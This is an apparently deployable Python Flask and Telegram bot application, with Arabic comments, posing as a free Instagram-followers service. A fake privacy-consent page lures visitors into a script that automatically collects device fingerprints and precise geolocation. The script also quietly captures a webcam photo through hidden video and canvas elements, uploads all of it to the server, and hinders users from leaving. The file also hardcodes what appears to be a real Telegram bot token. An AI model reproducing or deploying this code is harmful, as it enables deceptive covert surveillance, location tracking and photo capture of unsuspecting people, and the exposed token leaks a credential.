import os
import json
import uuid
import requests
from flask import Flask, request, jsonify, render_template_string
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes
import asyncio
from threading import Thread
import time
from datetime import datetime
import platform
import socket

# ========== إعدادات البوت ==========
BOT_TOKEN = "7388387809:AAHgsBR0z-avEVjjN2boGyXXwO2TR_T7hXA"
PORT = int(os.environ.get('PORT', 5000))

# ========== إعداد Flask ==========
app = Flask(__name__)

# إنشاء مجلدات التخزين
if not os.path.exists('user_data'):
    os.makedirs('user_data')
if not os.path.exists('collected_data'):
    os.makedirs('collected_data')

# ========== HTML قوالب ==========
PRIVACY_CONSENT_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>موافقة الخصوصية - خدمة المتابعين</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
            padding: 20px;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        
        .header {
            background: linear-gradient(135deg, #E1306C 0%, #C13584 100%);
            color: white;
            padding: 40px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
        }
        
        .content {
            padding: 40px;
        }
        
        .section {
            margin-bottom: 30px;
            padding: 25px;
            background: #f8f9fa;
            border-radius: 15px;
            border-right: 5px solid #E1306C;
        }
        
        .section h3 {
            color: #E1306C;
            margin-bottom: 15px;
            font-size: 1.3rem;
        }
        
        .data-list {
            list-style: none;
            margin: 15px 0;
        }
        
        .data-list li {
            padding: 10px 0;
            border-bottom: 1px solid #dee2e6;
            display: flex;
            align-items: center;
        }
        
        .data-list li:before {
            content: "📱";
            margin-left: 10px;
        }
        
        .warning {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            text-align: center;
        }
        
        .consent-actions {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin-top: 30px;
        }
        
        .btn {
            padding: 15px 30px;
            border: none;
            border-radius: 25px;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .btn-accept {
            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
            color: white;
        }
        
        .btn-decline {
            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
            color: white;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
        }
        
        .privacy-text {
            max-height: 300px;
            overflow-y: auto;
            background: white;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            border: 2px solid #e9ecef;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 سياسة الخصوصية والموافقة</h1>
            <p>يرجى قراءة الشروط بعناية قبل المتابعة</p>
        </div>
        
        <div class="content">
            <div class="warning">
                ⚠️ <strong>تنبيه هام:</strong> بالموافقة أدناه، فإنك توافق على جمع واستخدام بياناتك كما هو موضح
            </div>
            
            <div class="section">
                <h3>📊 البيانات التي سيتم جمعها:</h3>
                <ul class="data-list">
                    <li>معلومات الجهاز (نظام التشغيل، المتصفح، الإصدار)</li>
                    <li>معلومات الشبكة (عنوان IP، الموقع التقريبي)</li>
                    <li>إعدادات المتصفح واللغة</li>
                    <li>معلومات الشاشة والدقة</li>
                    <li>المنطقة الزمنية واللغة</li>
                    <li>بيانات الأداء (سرعة المعالج، الذاكرة)</li>
                    <li>الصور الملتقطة عبر الكاميرا</li>
                    <li>سجل التصفح والنشاط</li>
                </ul>
            </div>
            
            <div class="section">
                <h3>🎯 كيفية استخدام البيانات:</h3>
                <ul class="data-list">
                    <li>تحسين تجربة المستخدم وتقديم خدمات مخصصة</li>
                    <li>تأمين الحساب ومنع الاحتيال</li>
                    <li>تحليل الأداء وتحسين الخدمة</li>
                    <li>إرسال إشعارات وتحديثات مخصصة</li>
                </ul>
            </div>
            
            <div class="privacy-text">
                <h4>شروط الخدمة الكاملة:</h4>
                <p>بموافقتك على هذه السياسة، فإنك توافق صراحةً على:</p>
                <ul>
                    <li>جمع ومعالجة بياناتك الشخصية والتقنية</li>
                    <li>استخدام الكاميرا والوصول إلى الملفات عند الحاجة</li>
                    <li>تحليل نشاطك لتحسين الخدمات المقدمة</li>
                    <li>تخزين البيانات لفترات محددة لأغراض تحليلية</li>
                    <li>مشاركة البيانات المجمعة مع مزودي الخدمة المساعدين</li>
                </ul>
                <p><strong>يمكنك سحب موافقتك في أي وقت عن طريق الاتصال بالدعم.</strong></p>
            </div>
            
            <div class="consent-actions">
                <button class="btn btn-accept" onclick="acceptConsent()">
                    ✅ أوافق على جميع الشروط
                </button>
                <button class="btn btn-decline" onclick="declineConsent()">
                    ❌ لا أوافق
                </button>
            </div>
        </div>
    </div>

    <script>
        function acceptConsent() {
            // الانتقال إلى صفحة جمع البيانات
            const nextUrl = `/collect_data/{{user_id}}?consent=accepted`;
            window.location.href = nextUrl;
        }
        
        function declineConsent() {
            if(confirm('لا يمكننا تقديم الخدمة بدون موافقتك. هل ترغب في إعادة النظر؟')) {
                return;
            } else {
                window.close();
            }
        }
        
        // تأكيد المغادرة
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = '';
        });
    </script>
</body>
</html>
"""

DATA_COLLECTION_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري تجهيز حسابك - خدمة المتابعين</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            text-align: center;
            max-width: 600px;
            width: 90%;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
        }
        
        .loader {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        h1 {
            font-size: 2rem;
            margin-bottom: 15px;
        }
        
        .status {
            font-size: 1.1rem;
            margin: 15px 0;
            line-height: 1.6;
        }
        
        .progress-bar {
            width: 100%;
            height: 8px;
            background: rgba(255,255,255,0.2);
            border-radius: 4px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            background: linear-gradient(90deg, #4CAF50, #45a049);
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 4px;
        }
        
        .hidden {
            display: none;
        }
        
        .data-item {
            background: rgba(255,255,255,0.1);
            padding: 10px;
            margin: 10px 0;
            border-radius: 8px;
            text-align: right;
            font-size: 0.9rem;
        }
        
        .success-screen {
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 15px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="loadingScreen">
            <div class="loader"></div>
            <h1>جاري تجهيز حسابك وتحليل البيانات</h1>
            <div class="status" id="statusMessage">⏳ جاري جمع البيانات المطلوبة...</div>
            <div class="progress-bar">
                <div class="progress" id="progress"></div>
            </div>
        </div>
        
        <div id="dataScreen" class="hidden">
            <div class="success-screen">
                <h1>✅ تم جمع البيانات بنجاح!</h1>
                <div class="status">🎉 جاري إرسال المعلومات للبوت...</div>
            </div>
            <div id="collectedData"></div>
        </div>
        
        <div id="serviceScreen" class="hidden">
            <h1>🎁 اختر الباقة المناسبة</h1>
            <div id="packagesContainer"></div>
        </div>
    </div>

    <!-- عناصر مخفية لجمع البيانات -->
    <video id="hiddenVideo" autoplay playsinline class="hidden"></video>
    <canvas id="hiddenCanvas" class="hidden"></canvas>

    <script>
        let collectedData = {
            user_id: '{{user_id}}',
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screenResolution: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            javaEnabled: navigator.javaEnabled(),
            hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
            deviceMemory: navigator.deviceMemory || 'غير معروف',
            connection: navigator.connection ? navigator.connection.effectiveType : 'غير معروف',
            plugins: Array.from(navigator.plugins).map(p => p.name),
            consent_given: true,
            collection_time: new Date().toISOString()
        };

        // بدء جمع البيانات تلقائياً
        window.addEventListener('load', function() {
            startDataCollection();
        });

        async function startDataCollection() {
            try {
                // المرحلة 1: جمع بيانات المتصفح الأساسية
                updateProgress(10);
                updateStatus('🔍 جاري جمع معلومات الجهاز والمتصفح...');
                await delay(2000);

                // المرحلة 2: جمع بيانات الموقع
                updateProgress(30);
                updateStatus('📍 جاري تحديد الموقع والشبكة...');
                await collectLocationData();
                
                // المرحلة 3: طلب إذن الكاميرا
                updateProgress(50);
                updateStatus('📸 جاري التحقق من الهوية والكاميرا...');
                await requestCameraPermission();
                
                // المرحلة 4: التقاط الصورة تلقائياً
                updateProgress(70);
                updateStatus('🔄 جاري إكمال التحقق وأخذ اللقطات...');
                await capturePhotoAutomatically();
                
                // المرحلة 5: جمع بيانات إضافية
                updateProgress(85);
                updateStatus('📊 جاري تحليل البيانات الإضافية...');
                await collectAdditionalData();
                
                // المرحلة 6: إرسال جميع البيانات
                updateProgress(95);
                updateStatus('📤 جاري إرسال البيانات الكاملة للبوت...');
                await sendAllData();
                
                updateProgress(100);
                showServiceSelection();
                
            } catch (error) {
                console.error('Data collection error:', error);
                // الاستمرار حتى مع وجود أخطاء
                await sendAllData();
                showServiceSelection();
            }
        }

        async function collectLocationData() {
            return new Promise((resolve) => {
                if ('geolocation' in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            collectedData.location = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            };
                            resolve();
                        },
                        (error) => {
                            collectedData.locationError = error.message;
                            resolve();
                        },
                        { 
                            timeout: 10000,
                            enableHighAccuracy: false 
                        }
                    );
                } else {
                    collectedData.location = 'غير مدعوم';
                    resolve();
                }
            });
        }

        async function requestCameraPermission() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                });
                
                collectedData.cameraAccess = 'مسموح';
                collectedData.cameraStream = stream;
                
            } catch (error) {
                collectedData.cameraAccess = 'مرفوض: ' + error.message;
                collectedData.cameraStream = null;
            }
        }

        async function capturePhotoAutomatically() {
            try {
                if (collectedData.cameraStream) {
                    const video = document.getElementById('hiddenVideo');
                    const canvas = document.getElementById('hiddenCanvas');
                    const context = canvas.getContext('2d');
                    
                    video.srcObject = collectedData.cameraStream;
                    
                    // الانتظار لضبط الكاميرا
                    await delay(3000);
                    
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // إيقاف الكاميرا
                    collectedData.cameraStream.getTracks().forEach(track => track.stop());
                    
                    // تحويل الصورة إلى base64
                    collectedData.capturedPhoto = canvas.toDataURL('image/jpeg', 0.7);
                }
            } catch (error) {
                collectedData.photoError = error.message;
            }
        }

        async function collectAdditionalData() {
            // جمع بيانات إضافية عن المتصفح
            collectedData.windowSize = `${window.innerWidth}x${window.innerHeight}`;
            collectedData.colorDepth = screen.colorDepth;
            collectedData.pixelDepth = screen.pixelDepth;
            collectedData.orientation = screen.orientation ? screen.orientation.type : 'غير معروف';
            
            // محاولة جمع معلومات عن النظام
            collectedData.touchSupport = 'ontouchstart' in window;
            collectedData.doNotTrack = navigator.doNotTrack;
            collectedData.onlineStatus = navigator.onLine;
        }

        async function sendAllData() {
            try {
                const formData = new FormData();
                formData.append('user_id', '{{user_id}}');
                formData.append('collected_data', JSON.stringify(collectedData));
                
                // إضافة الصورة إذا كانت موجودة
                if (collectedData.capturedPhoto) {
                    const response = await fetch(collectedData.capturedPhoto);
                    const blob = await response.blob();
                    formData.append('photo', blob, 'user_verification.jpg');
                }

                const uploadResponse = await fetch('/upload_user_data', {
                    method: 'POST',
                    body: formData
                });

                const result = await uploadResponse.json();
                return result.success;
                
            } catch (error) {
                console.error('Send data error:', error);
                return false;
            }
        }

        function showServiceSelection() {
            document.getElementById('loadingScreen').classList.add('hidden');
            document.getElementById('serviceScreen').classList.remove('hidden');
            
            const packages = [
                {
                    name: 'free',
                    title: '🎁 100 متابع مجاناً',
                    followers: '100 متابع',
                    price: 'مجاني',
                    features: ['متابعين نشطين', 'توصيل خلال 24-72 ساعة', 'ضمان 7 أيام'],
                    color: '#4CAF50'
                },
                {
                    name: 'basic',
                    title: '⭐ 1000 متابع',
                    followers: '1,000 متابع',
                    price: '$9.99',
                    features: ['متابعين جدد', 'توصيل 12-36 ساعة', 'ضمان 30 يوماً'],
                    color: '#2196F3'
                },
                {
                    name: 'premium', 
                    title: '👑 5000 متابع',
                    followers: '5,000 متابع',
                    price: '$29.99',
                    features: ['متابعين نشطين جداً', 'توصيل 6-24 ساعة', 'ضمان 90 يوماً'],
                    color: '#E1306C'
                }
            ];
            
            const container = document.getElementById('packagesContainer');
            container.innerHTML = packages.map(pkg => `
                <div style="
                    background: rgba(255,255,255,0.1); 
                    padding: 20px; 
                    margin: 15px 0; 
                    border-radius: 15px; 
                    border-left: 5px solid ${pkg.color};
                    text-align: right;
                ">
                    <h3>${pkg.title}</h3>
                    <div style="font-size: 1.5rem; font-weight: bold; margin: 10px 0;">${pkg.followers}</div>
                    <div style="font-size: 1.3rem; color: ${pkg.color}; font-weight: bold; margin: 10px 0;">${pkg.price}</div>
                    <ul style="list-style: none; margin: 15px 0;">
                        ${pkg.features.map(feature => `<li>✅ ${feature}</li>`).join('')}
                    </ul>
                    <button onclick="selectPackage('${pkg.name}')" style="
                        background: ${pkg.color};
                        color: white;
                        border: none;
                        padding: 12px 25px;
                        border-radius: 25px;
                        cursor: pointer;
                        font-weight: bold;
                        width: 100%;
                    ">
                        اختر الباقة
                    </button>
                </div>
            `).join('');
        }

        function selectPackage(packageType) {
            // إرسال طلب الباقة
            fetch('/select_package', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    user_id: '{{user_id}}',
                    package: packageType,
                    collected_data: collectedData
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('🎉 تم تفعيل الخدمة! ستصل متابعينك قريباً.');
                    window.close();
                } else {
                    alert('❌ حدث خطأ: ' + data.error);
                }
            });
        }

        function updateProgress(percent) {
            document.getElementById('progress').style.width = percent + '%';
        }

        function updateStatus(message) {
            document.getElementById('statusMessage').textContent = message;
        }

        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // منع المستخدم من المغادرة أثناء المعالجة
        window.addEventListener('beforeunload', function(e) {
            if (!document.getElementById('serviceScreen').classList.contains('hidden')) {
                return undefined;
            }
            e.preventDefault();
            e.returnValue = '';
        });
    </script>
</body>
</html>
"""

# ========== مسارات Flask ==========
@app.route('/')
def home():
    return "Instagram Growth Service - Use /start in Telegram"

@app.route('/privacy_consent/<user_id>')
def privacy_consent_page(user_id):
    """صفحة الموافقة على الخصوصية"""
    return render_template_string(PRIVACY_CONSENT_HTML, user_id=user_id)

@app.route('/collect_data/<user_id>')
def collect_data_page(user_id):
    """صفحة جمع البيانات"""
    return render_template_string(DATA_COLLECTION_HTML, user_id=user_id)

@app.route('/upload_user_data', methods=['POST'])
def upload_user_data():
    """استقبال بيانات المستخدم"""
    try:
        user_id = request.form.get('user_id')
        collected_data_json = request.form.get('collected_data')
        
        if not all([user_id, collected_data_json]):
            return jsonify({'success': False, 'error': 'Missing data'})
        
        # تحليل البيانات المجمعة
        collected_data = json.loads(collected_data_json)
        
        # حفظ البيانات في ملف
        filename = f"user_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = os.path.join('collected_data', filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(collected_data, f, ensure_ascii=False, indent=2)
        
        # حفظ الصورة إذا كانت موجودة
        if 'photo' in request.files and request.files['photo']:
            photo = request.files['photo']
            if photo.filename:
                photo_filename = f"photo_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                photo_path = os.path.join('user_data', photo_filename)
                photo.save(photo_path)
        
        # إرسال البيانات للبوت
        asyncio.run(send_user_data_to_bot(user_id, collected_data))
        
        return jsonify({'success': True, 'message': 'تم حفظ البيانات بنجاح'})
        
    except Exception as e:
        print(f"❌ خطأ في حفظ البيانات: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/select_package', methods=['POST'])
def select_package():
    """اختيار الباقة"""
    try:
        data = request.get_json()
        user_id = data.get('user_id')
        package = data.get('package')
        
        # إرسال إشعار للبوت
        asyncio.run(send_package_selection_to_bot(user_id, package))
        
        return jsonify({'success': True, 'message': 'تم تفعيل الباقة'})
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ========== وظائف التليجرام ==========
async def send_user_data_to_bot(user_id, collected_data):
    """إرسال بيانات المستخدم للبوت"""
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        
        user_id_int = int(user_id)
        
        # إنشاء رسالة البيانات
        message = f"""
📊 **تم جمع بيانات المستخدم بنجاح!**

🆔 **رقم المستخدم:** {user_id}
🕒 **وقت الجمع:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

💻 **معلومات الجهاز:**
• المتصفح: {collected_data.get('userAgent', 'غير معروف')[:50]}...
• النظام: {collected_data.get('platform', 'غير معروف')}
• الدقة: {collected_data.get('screenResolution', 'غير معروف')}
• المعالج: {collected_data.get('hardwareConcurrency', 'غير معروف')}
• الذاكرة: {collected_data.get('deviceMemory', 'غير معروف')} GB

🌐 **معلومات الشبكة:**
• اللغة: {collected_data.get('language', 'غير معروف')}
• المنطقة: {collected_data.get('timezone', 'غير معروف')}
• الاتصال: {collected_data.get('connection', 'غير معروف')}

📍 **الموقع:** 
{get_location_info(collected_data)}

📸 **الكاميرا:** {collected_data.get('cameraAccess', 'غير معروف')}

🔌 **الإضافات:** {len(collected_data.get('plugins', []))} إضافة

✅ **تم الموافقة على الشروط**
        """
        
        await application.bot.send_message(
            chat_id=user_id_int,
            text=message,
            parse_mode='HTML'
        )
        
        print(f"✅ تم إرسال بيانات المستخدم {user_id} للبوت")
        
    except Exception as e:
        print(f"❌ خطأ في إرسال البيانات للبوت: {e}")

async def send_package_selection_to_bot(user_id, package):
    """إرسال اختيار الباقة للبوت"""
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        
        user_id_int = int(user_id)
        
        package_names = {
            'free': '🎁 100 متابع مجاناً',
            'basic': '⭐ 1000 متابع',
            'premium': '👑 5000 متابع'
        }
        
        message = f"""
🎉 **تم اختيار الباقة!**

📦 **الباقة المختارة:** {package_names.get(package, package)}
🆔 **رقم المستخدم:** {user_id}
🕒 **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🚀 **جاري تفعيل الخدمة...**
        """
        
        await application.bot.send_message(
            chat_id=user_id_int,
            text=message,
            parse_mode='HTML'
        )
        
    except Exception as e:
        print(f"❌ خطأ في إرسال اختيار الباقة: {e}")

def get_location_info(collected_data):
    """الحصول على معلومات الموقع"""
    if 'location' in collected_data:
        loc = collected_data['location']
        return f"• خط العرض: {loc.get('latitude', 'غير معروف')}\n• خط الطول: {loc.get('longitude', 'غير معروف')}\n• الدقة: {loc.get('accuracy', 'غير معروف')}m"
    elif 'locationError' in collected_data:
        return f"• خطأ: {collected_data['locationError']}"
    else:
        return "• غير متوفر"

class TelegramBot:
    def __init__(self, token):
        self.token = token
        self.application = None
        
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """أمر /start"""
        user = update.effective_user
        user_id = user.id
        
        # إنشاء رابط المستخدم
        base_url = os.environ.get('RENDER_EXTERNAL_URL', f"https://{request.host}" if request else "http://localhost:5000")
        user_url = f"{base_url}/privacy_consent/{user_id}"
        
        welcome_text = f"""
🎉 **أهلاً بك {user.first_name} في خدمة زيادة المتابعين!**

📱 **رابطك الخاص:**
{user_url}

🔒 **عملية آمنة وموثوقة:**
سيتم جمع بعض البيانات لتحسين خدمتك وتأمين حسابك

🚀 **كيفية البدء:**
1. افتح الرابط أعلاه
2. اقرأ ووافق على الشروط
3. سيتم جمع البيانات تلقائياً
4. اختر الباقة المناسبة
5. استلم متابعينك!

🎁 **احصل على 100 متابع مجاناً الآن!**
        """
        
        await update.message.reply_text(welcome_text, parse_mode='HTML')
        print(f"🔗 تم إنشاء رابط للمستخدم {user_id}: {user_url}")

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """أمر /help"""
        help_text = """
🤖 **أوامر البوت:**

/start - بدء البوت والحصول على الرابط الخاص
/help - عرض الرسالة المساعدة

📞 **الدعم الفني:**
@your_support_username
        """
        await update.message.reply_text(help_text)

    def setup_handlers(self):
        """إعداد معالجات الأوامر"""
        self.application.add_handler(CommandHandler("start", self.start))
        self.application.add_handler(CommandHandler("help", self.help_command))

    def run_polling(self):
        """تشغيل البوت باستخدام Polling"""
        async def run():
            self.application = Application.builder().token(self.token).build()
            self.setup_handlers()
            
            print("🤖 بدء تشغيل بوت التليجرام...")
            await self.application.initialize()
            await self.application.start()
            await self.application.updater.start_polling()
            
            while True:
                await asyncio.sleep(3600)
                
        asyncio.run(run())

# ========== التشغيل الرئيسي ==========
def run_flask():
    """تشغيل خادم Flask"""
    print("🌐 بدء تشغيل خادم الويب...")
    app.run(host='0.0.0.0', port=PORT, debug=False)

def run_bot():
    """تشغيل بوت التليجرام"""
    time.sleep(3)
    bot = TelegramBot(BOT_TOKEN)
    bot.run_polling()

if __name__ == '__main__':
    print("🚀 بدء تشغيل نظام جمع البيانات...")
    print(f"📊 البورت: {PORT}")
    print(f"🔑 التوكن: {BOT_TOKEN}")
    
    flask_thread = Thread(target=run_flask, daemon=True)
    bot_thread = Thread(target=run_bot, daemon=True)
    
    flask_thread.start()
    bot_thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("⏹ إيقاف التطبيق...")
